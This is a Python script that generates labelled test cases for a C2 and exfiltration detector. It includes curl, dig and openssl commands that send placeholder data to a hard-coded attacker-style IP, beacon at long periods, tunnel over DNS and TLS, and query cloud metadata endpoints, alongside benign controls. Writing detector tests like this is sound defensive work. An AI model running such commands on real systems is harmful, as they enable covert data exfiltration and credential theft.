"""
CAT 3 — Stealth C2 channels.

Subcategories:
  DOH        — DNS over HTTPS (Cloudflare, Google, Quad9)
  WS         — WebSocket C2
  WEBHOOK    — Slack/Discord/Telegram webhooks
  GIST       — GitHub gist as dead-drop
  LONGBEACON — beacons at long periods (5min, 15min, 1hr)
  STEG       — steganographic exfil (data in image POST)
  LOWDNS     — low-rate DNS exfil (defeats burst detector)
  IRC        — IRC over TLS
  IMDS       — cloud metadata service callbacks
  REAL_SNI   — TLS with valid-looking SNI to attacker
  HTTP_LEGIT — HTTPS POST to legit-looking domain
"""

C2 = "135.181.79.27"


def gen():
    tests = []
    i = 0

    # ============ DOH — DNS over HTTPS ============
    # Real DoH endpoints. Outbound TLS to these from non-resolver
    # process is suspicious. xhelix would need a rule to flag this.
    doh_servers = [
        ("cloudflare", "1.1.1.1", "cloudflare-dns.com"),
        ("cloudflare2","1.0.0.1", "cloudflare-dns.com"),
        ("google",     "8.8.8.8", "dns.google"),
        ("google2",    "8.8.4.4", "dns.google"),
        ("quad9",      "9.9.9.9", "dns.quad9.net"),
        ("nextdns",    "45.90.28.0", "dns.nextdns.io"),
    ]
    for name, ip, sni in doh_servers:
        for variant in range(4):
            i += 1
            # Real DoH query — this MAY succeed against the actual resolver
            tests.append({
                "id": f"C2-DOH-{i:04d}",
                "category": "C2",
                "subcategory": "doh",
                "malicious": True,
                "desc": f"DoH query via {name} v{variant}",
                "cmd": (
                    f"timeout 5 curl -sk --resolve {sni}:443:{ip} "
                    f"'https://{sni}/dns-query?name=example.com&type=A' "
                    f"-H 'accept: application/dns-json' >/dev/null 2>&1; true"
                ),
                "expect_rule": r"doh|dns_over_https|outbound_to_known_bad",
                "detector": "snicheck",
                "window": 6,
            })

    # ============ WS — WebSocket C2 ============
    # WebSocket upgrade against our test listener
    for variant in range(15):
        i += 1
        tests.append({
            "id": f"C2-WS-{i:04d}",
            "category": "C2",
            "subcategory": "websocket",
            "malicious": True,
            "desc": f"WebSocket upgrade C2 v{variant}",
            "cmd": (
                f"timeout 4 curl -s --http1.1 --include "
                f"-H 'Connection: Upgrade' -H 'Upgrade: websocket' "
                f"-H 'Sec-WebSocket-Version: 13' "
                f"-H 'Sec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==' "
                f"http://{C2}:14500/ws-{variant} >/dev/null 2>&1; true"
            ),
            "expect_rule": r"websocket|suspicious_interpreter_network",
            "detector": "rules.proc",
            "window": 6,
        })

    # ============ WEBHOOK — Slack/Discord/Telegram patterns ============
    webhook_patterns = [
        ("slack",     "/services/T00000000/B00000000/abcdefghijklmnop"),
        ("discord",   "/api/webhooks/000000000000000000/abcdefghijkl"),
        ("telegram",  "/bot1234567890:ABCDEF/sendMessage?chat_id=1&text=x"),
        ("ms_teams",  "/webhookb2/00000000-0000-0000-0000-000000000000"),
        ("pagerduty", "/v2/enqueue"),
        ("opsgenie",  "/v2/alerts"),
    ]
    for name, path in webhook_patterns:
        for variant in range(4):
            i += 1
            tests.append({
                "id": f"C2-WEBHOOK-{i:04d}",
                "category": "C2",
                "subcategory": "webhook",
                "malicious": True,
                "desc": f"webhook C2 via {name} v{variant}",
                "cmd": (
                    f"timeout 4 curl -s -X POST -H 'Content-Type: application/json' "
                    f"-d '{{\"text\":\"exfil-{variant}\"}}' "
                    f"http://{C2}:14501{path} >/dev/null 2>&1; true"
                ),
                "expect_rule": r"webhook|outbound_to_known_bad",
                "detector": "snicheck",
                "window": 6,
            })

    # ============ GIST — GitHub gist as dead-drop ============
    for variant in range(10):
        i += 1
        tests.append({
            "id": f"C2-GIST-{i:04d}",
            "category": "C2",
            "subcategory": "gist_deaddrop",
            "malicious": True,
            "desc": f"gist dead-drop pattern v{variant}",
            "cmd": (
                f"timeout 4 curl -s -X POST "
                f"-H 'Authorization: token ghp_FAKE' "
                f"-d '{{\"public\":true,\"files\":{{\"x{variant}.txt\":{{\"content\":\"exfil-{variant}\"}}}}}}' "
                f"http://{C2}:14502/gists >/dev/null 2>&1; true"
            ),
            "expect_rule": r"github|gist|outbound",
            "detector": "snicheck",
            "window": 6,
        })

    # ============ LONGBEACON — long-period callbacks ============
    # Real attackers use 5+ min periods. To keep test runtime sane,
    # we use 30-90s periods which still test the statistical detector
    # (beacon detector scores on period+jitter, not absolute period).
    # The 5-minute case is acknowledged in the report but not tested
    # here because it would balloon runtime to hours.
    for period in [30, 45, 60, 90]:
        for variant in range(5):
            i += 1
            tests.append({
                "id": f"C2-LONGBEACON-{i:04d}",
                "category": "C2",
                "subcategory": "long_beacon",
                "malicious": True,
                "desc": f"long-period beacon ({period}s) v{variant}",
                "cmd": (
                    f"timeout 2 curl -s http://{C2}:14503/lb-{variant}-1 >/dev/null 2>&1; "
                    f"sleep {period}; "
                    f"timeout 2 curl -s http://{C2}:14503/lb-{variant}-2 >/dev/null 2>&1; "
                    f"true"
                ),
                "expect_rule": r"beacon",
                "detector": "beacon",
                "window": period + 8,
            })

    # ============ STEG — steganographic exfil ============
    for variant in range(10):
        i += 1
        tests.append({
            "id": f"C2-STEG-{i:04d}",
            "category": "C2",
            "subcategory": "steganography",
            "malicious": True,
            "desc": f"image-POST exfil pattern v{variant}",
            "cmd": (
                f"echo 'secret-data-{variant}' | base64 | "
                f"timeout 4 curl -s -X POST --data-binary @- "
                f"-H 'Content-Type: image/png' "
                f"http://{C2}:14504/upload-{variant}.png >/dev/null 2>&1; true"
            ),
            "expect_rule": r"steganography|outbound",
            "detector": "rules.proc",
            "window": 6,
        })

    # ============ LOWDNS — low-rate DNS exfil ============
    for variant in range(10):
        i += 1
        tests.append({
            "id": f"C2-LOWDNS-{i:04d}",
            "category": "C2",
            "subcategory": "low_rate_dns_exfil",
            "malicious": True,
            "desc": f"low-rate DNS exfil (3 queries, 15s apart) v{variant}",
            "cmd": (
                f"dig data{variant}-1.exfil.example +short +timeout=1 +tries=1 >/dev/null 2>&1; sleep 15; "
                f"dig data{variant}-2.exfil.example +short +timeout=1 +tries=1 >/dev/null 2>&1; sleep 15; "
                f"dig data{variant}-3.exfil.example +short +timeout=1 +tries=1 >/dev/null 2>&1; true"
            ),
            "expect_rule": r"dns_exfil|dga|dns_burst",
            "detector": "dnsexfil",
            "window": 50,
        })

    # ============ IRC — IRC over TLS ============
    for variant in range(8):
        i += 1
        tests.append({
            "id": f"C2-IRC-{i:04d}",
            "category": "C2",
            "subcategory": "irc_tls",
            "malicious": True,
            "desc": f"IRC-over-TLS C2 pattern v{variant}",
            "cmd": (
                f"echo -e 'NICK bot{variant}\\r\\nUSER bot{variant} 0 * :x\\r\\n' | "
                f"timeout 4 openssl s_client -connect {C2}:14505 -quiet -noservername 2>/dev/null > /dev/null; "
                f"true"
            ),
            "expect_rule": r"tls_no_sni|irc",
            "detector": "snicheck",
            "window": 8,
        })

    # ============ IMDS — cloud metadata callbacks ============
    imds_targets = [
        ("aws_imds_v1", "http://169.254.169.254/latest/meta-data/"),
        ("aws_imds_v2", "http://169.254.169.254/latest/api/token"),
        ("gcp_imds",    "http://metadata.google.internal/computeMetadata/v1/"),
        ("azure_imds",  "http://169.254.169.254/metadata/instance"),
        ("alibaba",     "http://100.100.100.200/latest/meta-data/"),
        ("digitalocean","http://169.254.169.254/metadata/v1/"),
    ]
    for name, url in imds_targets:
        for variant in range(3):
            i += 1
            tests.append({
                "id": f"C2-IMDS-{i:04d}",
                "category": "C2",
                "subcategory": "imds",
                "malicious": True,
                "desc": f"IMDS query: {name} v{variant}",
                "cmd": (
                    f"timeout 3 curl -s -H 'Metadata-Flavor: Google' "
                    f"-H 'Metadata: true' -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600' "
                    f"'{url}' >/dev/null 2>&1; true"
                ),
                "expect_rule": r"metadata|imds|cloud_metadata",
                "detector": "rules.proc",
                "window": 6,
            })

    # ============ REAL_SNI — TLS with valid SNI to attacker ============
    # The hardest case — attacker registers a real domain + cert.
    # xhelix sees outbound TLS with a real SNI looking legit.
    fake_legit_sni = [
        "cdn.example.com", "api.update-service.com", "telemetry.product.io",
        "stats.web-analytics.com", "ingest.metric.io", "log.observability.net",
    ]
    for sni in fake_legit_sni:
        for variant in range(5):
            i += 1
            tests.append({
                "id": f"C2-RSNI-{i:04d}",
                "category": "C2",
                "subcategory": "real_sni_to_attacker",
                "malicious": True,
                "desc": f"TLS w/ legit-looking SNI {sni} v{variant}",
                "cmd": (
                    f"timeout 4 openssl s_client -connect {C2}:14506 "
                    f"-servername {sni} </dev/null 2>/dev/null > /dev/null; true"
                ),
                "expect_rule": r"threat_intel|outbound_to_known_bad|tls_no_sni",
                "detector": "snicheck",
                "window": 8,
            })

    # ============ HTTP_LEGIT — POST to legit-looking domains ============
    for variant in range(15):
        i += 1
        tests.append({
            "id": f"C2-HTTPLEGIT-{i:04d}",
            "category": "C2",
            "subcategory": "http_post_legit_shape",
            "malicious": True,
            "desc": f"HTTPS POST legit-shape v{variant}",
            "cmd": (
                f"timeout 4 curl -s -X POST -H 'User-Agent: Mozilla/5.0' "
                f"-H 'Content-Type: application/json' "
                f"-d '{{\"event\":\"telemetry\",\"data\":\"{variant}\"}}' "
                f"http://{C2}:14507/v1/telemetry >/dev/null 2>&1; true"
            ),
            "expect_rule": r"outbound_to_known_bad|webshell|exfil",
            "detector": "rules.proc",
            "window": 6,
        })

    # ============ BENIGN CONTROLS ============
    # B1: real curl to a real legitimate endpoint (cloudflare 1.1.1.1)
    for variant in range(8):
        i += 1
        tests.append({
            "id": f"C2-B-{i:04d}",
            "category": "C2",
            "subcategory": "benign_curl_legit",
            "malicious": False,
            "desc": f"benign: real HTTPS to 1.1.1.1 with SNI v{variant}",
            "cmd": "timeout 3 curl -sk https://1.1.1.1/cdn-cgi/trace >/dev/null 2>&1; true",
            "expect_rule": r"(?!.*)",
            "detector": "control",
            "window": 5,
        })

    # B2: legitimate apt-update HTTPS fetch
    for variant in range(5):
        i += 1
        tests.append({
            "id": f"C2-B-{i:04d}",
            "category": "C2",
            "subcategory": "benign_apt_update",
            "malicious": False,
            "desc": f"benign: apt-get update HTTPS fetch v{variant}",
            "cmd": "timeout 6 apt-get --quiet --quiet --no-download update >/dev/null 2>&1 || true",
            "expect_rule": r"(?!.*)",
            "detector": "control",
            "window": 8,
        })

    # B3: legitimate DNS query to system resolver
    for variant in range(8):
        i += 1
        tests.append({
            "id": f"C2-B-{i:04d}",
            "category": "C2",
            "subcategory": "benign_dns_lookup",
            "malicious": False,
            "desc": f"benign: dig example.com v{variant}",
            "cmd": "dig example.com +short +timeout=1 +tries=1 >/dev/null 2>&1; true",
            "expect_rule": r"(?!.*)",
            "detector": "control",
            "window": 5,
        })

    return tests


if __name__ == "__main__":
    t = gen()
    print(f"CAT 3 C2: {len(t)} tests")
    from collections import Counter
    by_sub = Counter(x["subcategory"] for x in t)
    for sub, n in by_sub.most_common():
        print(f"  {sub:<28} {n}")
    mal = sum(1 for x in t if x["malicious"])
    ben = sum(1 for x in t if not x["malicious"])
    print(f"  malicious: {mal}, benign: {ben}")
